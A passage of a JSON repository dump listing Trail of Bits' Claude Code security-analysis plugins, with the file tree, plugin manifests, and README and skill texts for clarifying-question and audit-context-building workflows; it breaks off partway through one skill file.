          "path": "plugins/semgrep-rule-variant-creator/.claude-plugin/plugin.json",
          "type": "blob",
          "size": 293
        },
        {
          "path": "plugins/semgrep-rule-variant-creator/README.md",
          "type": "blob",
          "size": 2775
        },
        {
          "path": "plugins/semgrep-rule-variant-creator/skills",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/semgrep-rule-variant-creator/skills/semgrep-rule-variant-creator",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/semgrep-rule-variant-creator/skills/semgrep-rule-variant-creator/SKILL.md",
          "type": "blob",
          "size": 8073
        },
        {
          "path": "plugins/semgrep-rule-variant-creator/skills/semgrep-rule-variant-creator/references",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/semgrep-rule-variant-creator/skills/semgrep-rule-variant-creator/references/applicability-analysis.md",
          "type": "blob",
          "size": 7520
        },
        {
          "path": "plugins/semgrep-rule-variant-creator/skills/semgrep-rule-variant-creator/references/language-syntax-guide.md",
          "type": "blob",
          "size": 7509
        },
        {
          "path": "plugins/semgrep-rule-variant-creator/skills/semgrep-rule-variant-creator/references/workflow.md",
          "type": "blob",
          "size": 13870
        },
        {
          "path": "plugins/sharp-edges",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sharp-edges/.claude-plugin",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sharp-edges/.claude-plugin/plugin.json",
          "type": "blob",
          "size": 308
        },
        {
          "path": "plugins/sharp-edges/README.md",
          "type": "blob",
          "size": 2088
        },
        {
          "path": "plugins/sharp-edges/skills",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sharp-edges/skills/sharp-edges",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sharp-edges/skills/sharp-edges/SKILL.md",
          "type": "blob",
          "size": 11426
        },
        {
          "path": "plugins/sharp-edges/skills/sharp-edges/references",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sharp-edges/skills/sharp-edges/references/auth-patterns.md",
          "type": "blob",
          "size": 6999
        },
        {
          "path": "plugins/sharp-edges/skills/sharp-edges/references/case-studies.md",
          "type": "blob",
          "size": 8143
        },
        {
          "path": "plugins/sharp-edges/skills/sharp-edges/references/config-patterns.md",
          "type": "blob",
          "size": 9729
        },
        {
          "path": "plugins/sharp-edges/skills/sharp-edges/references/crypto-apis.md",
          "type": "blob",
          "size": 5275
        },
        {
          "path": "plugins/sharp-edges/skills/sharp-edges/references/lang-c.md",
          "type": "blob",
          "size": 5683
        },
        {
          "path": "plugins/sharp-edges/skills/sharp-edges/references/lang-csharp.md",
          "type": "blob",
          "size": 7324
        },
        {
          "path": "plugins/sharp-edges/skills/sharp-edges/references/lang-go.md",
          "type": "blob",
          "size": 6661
        },
        {
          "path": "plugins/sharp-edges/skills/sharp-edges/references/lang-java.md",
          "type": "blob",
          "size": 6820
        },
        {
          "path": "plugins/sharp-edges/skills/sharp-edges/references/lang-javascript.md",
          "type": "blob",
          "size": 6933
        },
        {
          "path": "plugins/sharp-edges/skills/sharp-edges/references/lang-kotlin.md",
          "type": "blob",
          "size": 6751
        },
        {
          "path": "plugins/sharp-edges/skills/sharp-edges/references/lang-php.md",
          "type": "blob",
          "size": 6179
        },
        {
          "path": "plugins/sharp-edges/skills/sharp-edges/references/lang-python.md",
          "type": "blob",
          "size": 6616
        },
        {
          "path": "plugins/sharp-edges/skills/sharp-edges/references/lang-ruby.md",
          "type": "blob",
          "size": 6213
        },
        {
          "path": "plugins/sharp-edges/skills/sharp-edges/references/lang-rust.md",
          "type": "blob",
          "size": 6545
        },
        {
          "path": "plugins/sharp-edges/skills/sharp-edges/references/lang-swift.md",
          "type": "blob",
          "size": 6252
        },
        {
          "path": "plugins/sharp-edges/skills/sharp-edges/references/language-specific.md",
          "type": "blob",
          "size": 13267
        },
        {
          "path": "plugins/spec-to-code-compliance",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/spec-to-code-compliance/.claude-plugin",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/spec-to-code-compliance/.claude-plugin/plugin.json",
          "type": "blob",
          "size": 316
        },
        {
          "path": "plugins/spec-to-code-compliance/README.md",
          "type": "blob",
          "size": 2399
        },
        {
          "path": "plugins/spec-to-code-compliance/commands",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/spec-to-code-compliance/commands/spec-compliance.md",
          "type": "blob",
          "size": 547
        },
        {
          "path": "plugins/spec-to-code-compliance/skills",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/spec-to-code-compliance/skills/spec-to-code-compliance",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/spec-to-code-compliance/skills/spec-to-code-compliance/SKILL.md",
          "type": "blob",
          "size": 10282
        },
        {
          "path": "plugins/spec-to-code-compliance/skills/spec-to-code-compliance/resources",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/spec-to-code-compliance/skills/spec-to-code-compliance/resources/COMPLETENESS_CHECKLIST.md",
          "type": "blob",
          "size": 3327
        },
        {
          "path": "plugins/spec-to-code-compliance/skills/spec-to-code-compliance/resources/IR_EXAMPLES.md",
          "type": "blob",
          "size": 15134
        },
        {
          "path": "plugins/spec-to-code-compliance/skills/spec-to-code-compliance/resources/OUTPUT_REQUIREMENTS.md",
          "type": "blob",
          "size": 5461
        },
        {
          "path": "plugins/static-analysis",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/static-analysis/.claude-plugin",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/static-analysis/.claude-plugin/plugin.json",
          "type": "blob",
          "size": 222
        },
        {
          "path": "plugins/static-analysis/README.md",
          "type": "blob",
          "size": 2055
        },
        {
          "path": "plugins/static-analysis/skills",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/static-analysis/skills/codeql",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/static-analysis/skills/codeql/SKILL.md",
          "type": "blob",
          "size": 8726
        },
        {
          "path": "plugins/static-analysis/skills/sarif-parsing",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/static-analysis/skills/sarif-parsing/SKILL.md",
          "type": "blob",
          "size": 15203
        },
        {
          "path": "plugins/static-analysis/skills/sarif-parsing/resources",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/static-analysis/skills/sarif-parsing/resources/jq-queries.md",
          "type": "blob",
          "size": 5267
        },
        {
          "path": "plugins/static-analysis/skills/semgrep",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/static-analysis/skills/semgrep/SKILL.md",
          "type": "blob",
          "size": 8601
        },
        {
          "path": "plugins/testing-handbook-skills",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/testing-handbook-skills/.claude-plugin",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/testing-handbook-skills/.claude-plugin/plugin.json",
          "type": "blob",
          "size": 213
        },
        {
          "path": "plugins/testing-handbook-skills/README.md",
          "type": "blob",
          "size": 7029
        },
        {
          "path": "plugins/testing-handbook-skills/skills",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/testing-handbook-skills/skills/address-sanitizer",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/testing-handbook-skills/skills/address-sanitizer/SKILL.md",
          "type": "blob",
          "size": 11272
        },
        {
          "path": "plugins/testing-handbook-skills/skills/aflpp",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/testing-handbook-skills/skills/aflpp/SKILL.md",
          "type": "blob",
          "size": 19744
        },
        {
          "path": "plugins/testing-handbook-skills/skills/atheris",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/testing-handbook-skills/skills/atheris/SKILL.md",
          "type": "blob",
          "size": 14423
        },
        {
          "path": "plugins/testing-handbook-skills/skills/cargo-fuzz",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/testing-handbook-skills/skills/cargo-fuzz/SKILL.md",
          "type": "blob",
          "size": 11506
        },
        {
          "path": "plugins/testing-handbook-skills/skills/codeql",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/testing-handbook-skills/skills/codeql/SKILL.md",
          "type": "blob",
          "size": 19353
        },
        {
          "path": "plugins/testing-handbook-skills/skills/constant-time-testing",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/testing-handbook-skills/skills/constant-time-testing/SKILL.md",
          "type": "blob",
          "size": 21567
        },
        {
          "path": "plugins/testing-handbook-skills/skills/coverage-analysis",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/testing-handbook-skills/skills/coverage-analysis/SKILL.md",
          "type": "blob",
          "size": 20696
        },
        {
          "path": "plugins/testing-handbook-skills/skills/fuzzing-dictionary",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/testing-handbook-skills/skills/fuzzing-dictionary/SKILL.md",
          "type": "blob",
          "size": 9684
        },
        {
          "path": "plugins/testing-handbook-skills/skills/fuzzing-obstacles",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/testing-handbook-skills/skills/fuzzing-obstacles/SKILL.md",
          "type": "blob",
          "size": 15501
        },
        {
          "path": "plugins/testing-handbook-skills/skills/harness-writing",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/testing-handbook-skills/skills/harness-writing/SKILL.md",
          "type": "blob",
          "size": 20965
        },
        {
          "path": "plugins/testing-handbook-skills/skills/libafl",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/testing-handbook-skills/skills/libafl/SKILL.md",
          "type": "blob",
          "size": 16907
        },
        {
          "path": "plugins/testing-handbook-skills/skills/libfuzzer",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/testing-handbook-skills/skills/libfuzzer/SKILL.md",
          "type": "blob",
          "size": 23925
        },
        {
          "path": "plugins/testing-handbook-skills/skills/ossfuzz",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/testing-handbook-skills/skills/ossfuzz/SKILL.md",
          "type": "blob",
          "size": 16124
        },
        {
          "path": "plugins/testing-handbook-skills/skills/ruzzy",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/testing-handbook-skills/skills/ruzzy/SKILL.md",
          "type": "blob",
          "size": 11936
        },
        {
          "path": "plugins/testing-handbook-skills/skills/semgrep",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/testing-handbook-skills/skills/semgrep/SKILL.md",
          "type": "blob",
          "size": 15813
        },
        {
          "path": "plugins/testing-handbook-skills/skills/testing-handbook-generator",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/testing-handbook-skills/skills/testing-handbook-generator/SKILL.md",
          "type": "blob",
          "size": 14464
        },
        {
          "path": "plugins/testing-handbook-skills/skills/testing-handbook-generator/agent-prompt.md",
          "type": "blob",
          "size": 10197
        },
        {
          "path": "plugins/testing-handbook-skills/skills/testing-handbook-generator/discovery.md",
          "type": "blob",
          "size": 15748
        },
        {
          "path": "plugins/testing-handbook-skills/skills/testing-handbook-generator/templates",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/testing-handbook-skills/skills/testing-handbook-generator/templates/domain-skill.md",
          "type": "blob",
          "size": 16393
        },
        {
          "path": "plugins/testing-handbook-skills/skills/testing-handbook-generator/templates/fuzzer-skill.md",
          "type": "blob",
          "size": 10672
        },
        {
          "path": "plugins/testing-handbook-skills/skills/testing-handbook-generator/templates/technique-skill.md",
          "type": "blob",
          "size": 11909
        },
        {
          "path": "plugins/testing-handbook-skills/skills/testing-handbook-generator/templates/tool-skill.md",
          "type": "blob",
          "size": 9076
        },
        {
          "path": "plugins/testing-handbook-skills/skills/testing-handbook-generator/testing.md",
          "type": "blob",
          "size": 16124
        },
        {
          "path": "plugins/testing-handbook-skills/skills/wycheproof",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/testing-handbook-skills/skills/wycheproof/SKILL.md",
          "type": "blob",
          "size": 20367
        },
        {
          "path": "plugins/variant-analysis",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/variant-analysis/.claude-plugin",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/variant-analysis/.claude-plugin/plugin.json",
          "type": "blob",
          "size": 206
        },
        {
          "path": "plugins/variant-analysis/README.md",
          "type": "blob",
          "size": 1491
        },
        {
          "path": "plugins/variant-analysis/commands",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/variant-analysis/commands/variants.md",
          "type": "blob",
          "size": 571
        },
        {
          "path": "plugins/variant-analysis/skills",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/variant-analysis/skills/variant-analysis",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/variant-analysis/skills/variant-analysis/METHODOLOGY.md",
          "type": "blob",
          "size": 9590
        },
        {
          "path": "plugins/variant-analysis/skills/variant-analysis/SKILL.md",
          "type": "blob",
          "size": 5650
        },
        {
          "path": "plugins/variant-analysis/skills/variant-analysis/resources",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/variant-analysis/skills/variant-analysis/resources/variant-report-template.md",
          "type": "blob",
          "size": 1355
        }
      ],
      "files": {
        ".claude-plugin/marketplace.json": "{\n  \"name\": \"trailofbits\",\n  \"owner\": {\n    \"name\": \"Trail of Bits\",\n    \"email\": \"opensource@trailofbits.com\"\n  },\n  \"metadata\": {\n    \"version\": \"1.0.0\",\n    \"description\": \"Claude Code plugins from Trail of Bits for enhanced AI-assisted security analysis and development\"\n  },\n  \"plugins\": [\n    {\n      \"name\": \"ask-questions-if-underspecified\",\n      \"version\": \"1.0.0\",\n      \"description\": \"Clarify requirements before implementing. When doubting, ask questions.\",\n      \"author\": {\n        \"name\": \"Kevin Valerio\",\n        \"email\": \"opensource@trailofbits.com\",\n        \"url\": \"https://github.com/trailofbits\"\n      },\n      \"source\": \"./plugins/ask-questions-if-underspecified\"\n    },\n    {\n      \"name\": \"audit-context-building\",\n      \"description\": \"Build deep architectural context through ultra-granular code analysis before vulnerability hunting\",\n      \"version\": \"1.0.0\",\n      \"author\": {\n        \"name\": \"Omar Inuwa\"\n      },\n      \"source\": \"./plugins/audit-context-building\"\n    },\n    {\n      \"name\": \"building-secure-contracts\",\n      \"version\": \"1.0.0\",\n      \"description\": \"Comprehensive smart contract security toolkit based on Trail of Bits' Building Secure Contracts framework. Includes vulnerability scanners for 6 blockchains and 5 development guideline assistants.\",\n      \"author\": {\n        \"name\": \"Omar Inuwa\"\n      },\n      \"source\": \"./plugins/building-secure-contracts\"\n    },\n    {\n      \"name\": \"burpsuite-project-parser\",\n      \"version\": \"1.0.0\",\n      \"description\": \"Search and extract data from Burp Suite project files (.burp) for use in Claude\",\n      \"author\": {\n        \"name\": \"Will Vandevanter\"\n      },\n      \"source\": \"./plugins/burpsuite-project-parser\"\n    },\n    {\n      \"name\": \"constant-time-analysis\",\n      \"version\": \"0.1.0\",\n      \"description\": \"Detect compiler-induced timing side-channels in cryptographic code\",\n      \"author\": {\n        \"name\": \"Scott Arciszewski\",\n        \"email\": \"opensource@trailofbits.com\"\n      },\n      \"source\": \"./plugins/constant-time-analysis\"\n    },\n    {\n      \"name\": \"culture-index\",\n      \"version\": \"1.0.0\",\n      \"description\": \"Interprets Culture Index survey results for individuals and teams\",\n      \"author\": {\n        \"name\": \"Dan Guido\"\n      },\n      \"source\": \"./plugins/culture-index\"\n    },\n    {\n      \"name\": \"differential-review\",\n      \"description\": \"Security-focused differential review of code changes with git history analysis and blast radius estimation\",\n      \"version\": \"1.0.0\",\n      \"author\": {\n        \"name\": \"Omar Inuwa\"\n      },\n      \"source\": \"./plugins/differential-review\"\n    },\n    {\n      \"name\": \"firebase-apk-scanner\",\n      \"version\": \"2.1.0\",\n      \"description\": \"Scan Android APKs for Firebase security misconfigurations including open databases, storage buckets, authentication issues, and exposed cloud functions. For authorized security research only.\",\n      \"author\": {\n        \"name\": \"Nick Sellier\"\n      },\n      \"source\": \"./plugins/firebase-apk-scanner\"\n    },\n    {\n      \"name\": \"fix-review\",\n      \"description\": \"Verify fix commits address audit findings without introducing bugs\",\n      \"version\": \"0.1.0\",\n      \"author\": {\n        \"name\": \"Trail of Bits\",\n        \"email\": \"opensource@trailofbits.com\"\n      },\n      \"source\": \"./plugins/fix-review\"\n    },\n    {\n      \"name\": \"dwarf-expert\",\n      \"description\": \"Interact with and understand the DWARF debugging format\",\n      \"version\": \"1.0.0\",\n      \"author\": {\n        \"name\": \"Evan Hellman\",\n        \"email\": \"opensource@trailofbits.com\"\n      },\n      \"source\": \"./plugins/dwarf-expert\"\n    },\n    {\n      \"name\": \"entry-point-analyzer\",\n      \"version\": \"1.0.0\",\n      \"description\": \"Analyzes smart contract codebases to identify state-changing entry points for security auditing. Detects externally callable functions that modify state, categorizes them by access level, and generates structured audit reports.\",\n      \"author\": {\n        \"name\": \"Nicolas Donboly\",\n        \"email\": \"opensource@trailofbits.com\",\n        \"url\": \"https://github.com/trailofbits\"\n      },\n      \"source\": \"./plugins/entry-point-analyzer\"\n    },\n    {\n      \"name\": \"property-based-testing\",\n      \"description\": \"Property-based testing guidance for multiple languages and smart contracts\",\n      \"version\": \"1.0.0\",\n      \"author\": {\n        \"name\": \"Henrik Brodin\",\n        \"email\": \"opensource@trailofbits.com\"\n      },\n      \"source\": \"./plugins/property-based-testing\"\n    },\n    {\n      \"name\": \"semgrep-rule-creator\",\n      \"version\": \"1.0.0\",\n      \"description\": \"Create custom Semgrep rules for detecting bug patterns and security vulnerabilities\",\n      \"author\": {\n        \"name\": \"Maciej Domanski\"\n      },\n      \"source\": \"./plugins/semgrep-rule-creator\"\n    },\n    {\n      \"name\": \"semgrep-rule-variant-creator\",\n      \"version\": \"1.0.0\",\n      \"description\": \"Creates language variants of existing Semgrep rules with proper applicability analysis and test-driven validation\",\n      \"author\": {\n        \"name\": \"Maciej Domanski\",\n        \"email\": \"opensource@trailofbits.com\"\n      },\n      \"source\": \"./plugins/semgrep-rule-variant-creator\"\n    },\n    {\n      \"name\": \"sharp-edges\",\n      \"version\": \"1.0.0\",\n      \"description\": \"Identify error-prone APIs, dangerous configurations, and footgun designs that enable security mistakes\",\n      \"author\": {\n        \"name\": \"Scott Arciszewski\",\n        \"email\": \"opensource@trailofbits.com\",\n        \"url\": \"https://github.com/trailofbits\"\n      },\n      \"source\": \"./plugins/sharp-edges\"\n    },\n    {\n      \"name\": \"static-analysis\",\n      \"version\": \"1.0.1\",\n      \"description\": \"Static analysis toolkit with CodeQL, Semgrep, and SARIF parsing for security vulnerability detection\",\n      \"author\": {\n        \"name\": \"Axel Mierczuk\"\n      },\n      \"source\": \"./plugins/static-analysis\"\n    },\n    {\n      \"name\": \"spec-to-code-compliance\",\n      \"description\": \"Specification-to-code compliance checker for blockchain audits with evidence-based alignment analysis\",\n      \"version\": \"1.0.0\",\n      \"author\": {\n        \"name\": \"Omar Inuwa\"\n      },\n      \"source\": \"./plugins/spec-to-code-compliance\"\n    },\n    {\n      \"name\": \"testing-handbook-skills\",\n      \"version\": \"1.0.0\",\n      \"description\": \"Skills from the Trail of Bits Application Security Testing Handbook (appsec.guide)\",\n      \"author\": {\n        \"name\": \"Pawe Patek\"\n      },\n      \"source\": \"./plugins/testing-handbook-skills\"\n    },\n    {\n      \"name\": \"variant-analysis\",\n      \"version\": \"1.0.0\",\n      \"description\": \"Find similar vulnerabilities and bugs across codebases using pattern-based analysis\",\n      \"author\": {\n        \"name\": \"Axel Mierczuk\"\n      },\n      \"source\": \"./plugins/variant-analysis\"\n    },\n    {\n      \"name\": \"modern-python\",\n      \"version\": \"1.2.0\",\n      \"description\": \"Modern Python best practices. Use when creating new Python projects, and writing Python scripts, or migrating existing projects from legacy tools.\",\n      \"author\": {\n        \"name\": \"William Tan\",\n        \"email\": \"opensource@trailofbits.com\",\n        \"url\": \"https://github.com/trailofbits\"\n      },\n      \"source\": \"./plugins/modern-python\"\n    },\n    {\n      \"name\": \"insecure-defaults\",\n      \"version\": \"1.0.0\",\n      \"description\": \"Detects and verifies insecure default configurations including hardcoded credentials, fallback secrets, weak authentication defaults, and dangerous configuration values that remain active in production\",\n      \"author\": {\n        \"name\": \"Trail of Bits\",\n        \"email\": \"opensource@trailofbits.com\",\n        \"url\": \"https://github.com/trailofbits\"\n      },\n      \"source\": \"./plugins/insecure-defaults\"\n    }\n  ]\n}\n",
        "plugins/ask-questions-if-underspecified/.claude-plugin/plugin.json": "{\n  \"name\": \"ask-questions-if-underspecified\",\n  \"version\": \"1.0.0\",\n  \"description\": \"Clarify requirements before implementing. Do not use automatically, only when invoked explicitly.\",\n  \"author\": {\n    \"name\": \"Kevin Valerio\",\n    \"email\": \"opensource@trailofbits.com\",\n    \"url\": \"https://github.com/trailofbits\"\n  }\n}\n",
        "plugins/ask-questions-if-underspecified/README.md": "# Ask Questions If Underspecified\n\nAsk the minimum set of clarifying questions needed to avoid wrong work.  \n\n**Author:** Kevin Valerio\n\n## When to Use\n\nUse this skill when:\n- The request has multiple plausible interpretations\n- Success criteria, scope, constraints, or environment details are unclear\n- Starting implementation without clarification risks doing the wrong work\n\n## What It Does\n\n- Asks 15 must-have questions in a scannable, answerable format (multiple choice + defaults)\n- Pauses before acting until required answers are provided (unless the user approves proceeding on stated assumptions)\n- Restates confirmed requirements before starting work\n\n## Installation\n\n```\n/plugin install trailofbits/skills/plugins/ask-questions-if-underspecified\n```\n",
        "plugins/ask-questions-if-underspecified/skills/ask-questions-if-underspecified/SKILL.md": "---\nname: ask-questions-if-underspecified\ndescription: Clarify requirements before implementing. Use when serious doubts arise.\n---\n\n# Ask Questions If Underspecified\n\n## When to Use\n\nUse this skill when a request has multiple plausible interpretations or key details (objective, scope, constraints, environment, or safety) are unclear.\n\n## When NOT to Use\n\nDo not use this skill when the request is already clear, or when a quick, low-risk discovery read can answer the missing details.\n\n## Goal\n\nAsk the minimum set of clarifying questions needed to avoid wrong work; do not start implementing until the must-have questions are answered (or the user explicitly approves proceeding with stated assumptions).\n\n## Workflow\n\n### 1) Decide whether the request is underspecified\n\nTreat a request as underspecified if after exploring how to perform the work, some or all of the following are not clear:\n- Define the objective (what should change vs stay the same)\n- Define \"done\" (acceptance criteria, examples, edge cases)\n- Define scope (which files/components/users are in/out)\n- Define constraints (compatibility, performance, style, deps, time)\n- Identify environment (language/runtime versions, OS, build/test runner)\n- Clarify safety/reversibility (data migration, rollout/rollback, risk)\n\nIf multiple plausible interpretations exist, assume it is underspecified.\n\n### 2) Ask must-have questions first (keep it small)\n\nAsk 1-5 questions in the first pass. Prefer questions that eliminate whole branches of work.\n\nMake questions easy to answer:\n- Optimize for scannability (short, numbered questions; avoid paragraphs)\n- Offer multiple-choice options when possible\n- Suggest reasonable defaults when appropriate (mark them clearly as the default/recommended choice; bold the recommended choice in the list, or if you present options in a code block, put a bold \"Recommended\" line immediately above the block and also tag defaults inside the block)\n- Include a fast-path response (e.g., reply `defaults` to accept all recommended/default choices)\n- Include a low-friction \"not sure\" option when helpful (e.g., \"Not sure - use default\")\n- Separate \"Need to know\" from \"Nice to know\" if that reduces friction\n- Structure options so the user can respond with compact decisions (e.g., `1b 2a 3c`); restate the chosen options in plain language to confirm\n\n### 3) Pause before acting\n\nUntil must-have answers arrive:\n- Do not run commands, edit files, or produce a detailed plan that depends on unknowns\n- Do perform a clearly labeled, low-risk discovery step only if it does not commit you to a direction (e.g., inspect repo structure, read relevant config files)\n\nIf the user explicitly asks you to proceed without answers:\n- State your assumptions as a short numbered list\n- Ask for confirmation; proceed only after they confirm or correct them\n\n### 4) Confirm interpretation, then proceed\n\nOnce you have answers, restate the requirements in 1-3 sentences (including key constraints and what success looks like), then start work.\n\n## Question templates\n\n- \"Before I start, I need: (1) ..., (2) ..., (3) .... If you don't care about (2), I will assume ....\"\n- \"Which of these should it be? A) ... B) ... C) ... (pick one)\"\n- \"What would you consider 'done'? For example: ...\"\n- \"Any constraints I must follow (versions, performance, style, deps)? If none, I will target the existing project defaults.\"\n- Use numbered questions with lettered options and a clear reply format\n\n```text\n1) Scope?\na) Minimal change (default)\nb) Refactor while touching the area\nc) Not sure - use default\n2) Compatibility target?\na) Current project defaults (default)\nb) Also support older versions: <specify>\nc) Not sure - use default\n\nReply with: defaults (or 1a 2a)\n```\n\n## Anti-patterns\n\n- Don't ask questions you can answer with a quick, low-risk discovery read (e.g., configs, existing patterns, docs).\n- Don't ask open-ended questions if a tight multiple-choice or yes/no would eliminate ambiguity faster.\n",
        "plugins/audit-context-building/.claude-plugin/plugin.json": "{\n  \"name\": \"audit-context-building\",\n  \"version\": \"1.0.0\",\n  \"description\": \"Build deep architectural context through ultra-granular code analysis before vulnerability hunting\",\n  \"author\": {\n    \"name\": \"Omar Inuwa\",\n    \"email\": \"opensource@trailofbits.com\",\n    \"url\": \"https://github.com/trailofbits\"\n  }\n}\n",
        "plugins/audit-context-building/README.md": "# Audit Context Building\n\nBuild deep architectural context through ultra-granular code analysis before vulnerability hunting.\n\n**Author:** Omar Inuwa\n\n## When to Use\n\nUse this skill when you need to:\n- Develop deep comprehension of a codebase before security auditing\n- Build bottom-up understanding instead of high-level guessing\n- Reduce hallucinations and context loss during complex analysis\n- Prepare for threat modeling or architecture review\n\n## What It Does\n\nThis skill governs how Claude thinks during the context-building phase of an audit. When active, Claude will:\n\n- Perform **line-by-line / block-by-block** code analysis\n- Apply **First Principles**, **5 Whys**, and **5 Hows** at micro scale\n- Build and maintain a stable, explicit mental model\n- Identify invariants, assumptions, flows, and reasoning hazards\n- Track cross-function and external call flows with full context propagation\n\n## Key Principle\n\nThis is a **pure context building** skill. It does NOT:\n- Identify vulnerabilities\n- Propose fixes\n- Generate proofs-of-concept\n- Assign severity or impact\n\nIt exists solely to build deep understanding before the vulnerability-hunting phase.\n\n## Installation\n\n```\n/plugin install trailofbits/skills/plugins/audit-context-building\n```\n\n## Phases\n\n1. **Initial Orientation** - Map modules, entrypoints, actors, and storage\n2. **Ultra-Granular Function Analysis** - Line-by-line semantic analysis with cross-function flow tracking\n3. **Global System Understanding** - State/invariant reconstruction, workflow mapping, trust boundaries\n\n## Anti-Hallucination Rules\n\n- Never reshape evidence to fit earlier assumptions\n- Update the model explicitly when contradicted\n- Avoid vague guesses; use \"Unclear; need to inspect X\"\n- Cross-reference constantly to maintain global coherence\n\n## Related Skills\n\n- `issue-writer` - Write up findings after context is built\n- `differential-review` - Uses context-building for baseline analysis\n- `spec-compliance` - Compare understood behavior to documentation\n",
        "plugins/audit-context-building/commands/audit-context.md": "---\nname: trailofbits:audit-context\ndescription: Builds deep architectural context before vulnerability hunting\nargument-hint: \"<codebase-path> [--focus <module>]\"\nallowed-tools:\n  - Read\n  - Grep\n  - Glob\n  - Bash\n  - Task\n---\n\n# Build Audit Context\n\n**Arguments:** $ARGUMENTS\n\nParse arguments:\n1. **Codebase path** (required): Path to codebase to analyze\n2. **Focus** (optional): `--focus <module>` for specific module analysis\n\nInvoke the `audit-context-building` skill with these arguments for the full workflow.\n",
        "plugins/audit-context-building/skills/audit-context-building/SKILL.md": "---\nname: audit-context-building\ndescription: Enables ultra-granular, line-by-line code analysis to build deep architectural context before vulnerability or bug finding.\n---\n\n# Deep Context Builder Skill (Ultra-Granular Pure Context Mode)\n\n## 1. Purpose\n\nThis skill governs **how Claude thinks** during the context-building phase of an audit.\n\nWhen active, Claude will:\n- Perform **line-by-line / block-by-block** code analysis by default.\n- Apply **First Principles**, **5 Whys**, and **5 Hows** at micro scale.\n- Continuously link insights  functions  modules  entire system.\n- Maintain a stable, explicit mental model that evolves with new evidence.\n- Identify invariants, assumptions, flows, and reasoning hazards.\n\nThis skill defines a structured analysis format (see Example: Function Micro-Analysis below) and runs **before** the vulnerability-hunting phase.\n\n---\n\n## 2. When to Use This Skill\n\nUse when:\n- Deep comprehension is needed before bug or vulnerability discovery.\n- You want bottom-up understanding instead of high-level guessing.\n- Reducing hallucinations, contradictions, and context loss is critical.\n- Preparing for security auditing, architecture review, or threat modeling.\n\nDo **not** use for:\n- Vulnerability findings\n- Fix recommendations\n- Exploit reasoning\n- Severity/impact rating\n\n---\n\n## 3. How This Skill Behaves\n\nWhen active, Claude will:\n- Default to **ultra-granular analysis** of each block and line.\n- Apply micro-level First Principles, 5 Whys, and 5 Hows.\n- Build and refine a persistent global mental model.\n- Update earlier assumptions when contradicted (\"Earlier I thought X; now Y.\").\n- Periodically anchor summaries to maintain stable context.\n- Avoid speculation; express uncertainty explicitly when needed.\n\nGoal: **deep, accurate understanding**, not conclusions.\n\n---\n\n## Rationalizations (Do Not Skip)\n\n| Rationalization | Why It's Wrong | Required Action |\n|-----------------|----------------|-----------------|\n| \"I get the gist\" | Gist-level understanding misses edge cases | Line-by-line analysis required |\n| \"This function is simple\" | Simple functions compose into complex bugs | Apply 5 Whys anyway |\n| \"I'll remember this invariant\" | You won't. Context degrades. | Write it down explicitly |\n| \"External call is probably fine\" | External = adversarial until proven otherwise | Jump into code or model as hostile |\n| \"I can skip this helper\" | Helpers contain assumptions that propagate | Trace the full call chain |\n| \"This is taking too long\" | Rushed context = hallucinated vulnerabilities later | Slow is fast |\n\n---\n\n## 4. Phase 1  Initial Orientation (Bottom-Up Scan)\n\nBefore deep analysis, Claude performs a minimal mapping:\n\n1. Identify major modules/files/contracts.\n2. Note obvious public/external entrypoints.\n3. Identify likely actors (users, owners, relayers, oracles, other contracts).\n4. Identify important storage variables, dicts, state structs, or cells.\n5. Build a preliminary structure without assuming behavior.\n\nThis establishes anchors for detailed analysis.\n\n---\n\n## 5. Phase 2  Ultra-Granular Function Analysis (Default Mode)\n\nEvery non-trivial function receives full micro analysis.\n\n### 5.1 Per-Function Microstructure Checklist\n\nFor each function:\n\n1. **Purpose**\n   - Why the function exists and its role in the system.\n\n2. **Inputs & Assumptions**\n   - Parameters and implicit inputs (state, sender, env).\n   - Preconditions and constraints.\n\n3. **Outputs & Effects**\n   - Return values.\n   - State/storage writes.\n   - 